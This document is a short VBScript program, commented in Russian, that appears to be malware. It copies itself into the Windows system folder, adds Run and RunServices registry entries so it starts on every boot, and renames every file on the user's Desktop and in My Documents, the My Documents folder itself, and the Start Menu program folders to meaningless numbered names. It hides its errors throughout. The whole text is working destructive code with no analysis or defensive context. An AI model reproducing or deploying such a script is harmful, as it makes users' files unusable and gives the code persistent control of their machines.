Set FileSystemObject = CreateObject("scripting.filesystemobject")
Set Shell = CreateObject("Wscript.Shell")
t = 0: On Error Resume Next ' Пропускать ошибки
Set Application = CreateObject("Shell.Application")
Set InternerExplorer = WScript.CreateObject("InternetExplorer.Application")
Set Outlook = WScript.CreateObject("Outlook.Application")

Set File2 = FileSystemObject.GetFile(WScript.FullName)
File2.Copy ("c:\windows\System\Gigabyte.vbs")
Shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Gigabyte", "C:\WINDOWS\SYSTEM\Gigabyte.vbs"
Shell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Gigabyte", "C:\WINDOWS\SYSTEM\Gigabyte.vbs"

' Переименование всех файлов, находящихся на Робочем столе на "123"
For Each Folder In Shell.SpecialFolders
If right(folder,12) = "Рабочий стол" Then 
Set tf = FileSystemObject.getfolder(folder)
Set af = tf.files
For Each fl In af
Set file = FileSystemObject.getfile(fl):t = t+1
file.name = "123" & t
Next
End If
Next

' Переименование всех файлов, находящихся в Моих документах на "321"
For Each Folder In Shell.SpecialFolders
If right(folder,13) = "Мои документы" Then 
Set tf = FileSystemObject.getfolder(folder)
Set af = tf.files
For Each fl In af
Set file = FileSystemObject.getfile(fl):t = t+1
file.name = "321" & t
Next
End If
Next

' Переименование папки Мои документы на "132"
For Each Folder In Shell.SpecialFolders
If right(folder,13) = "Мои документы" Then 
Set tf = FileSystemObject.getfolder(folder): tf.name = "132"
End If
Next

' Переименование всех файлов, находящихся в Главное меню\Программы на "231"
For Each Folder In Shell.SpecialFolders
If right(folder,12) = "Главное меню" Then 
Set tf = FileSystemObject.getfolder(folder)
Set af = tf.subfolders
For Each fl In af
Set file = FileSystemObject.getfolder(fl):t = t+1
file.name = "231" & t
Next
End If
Next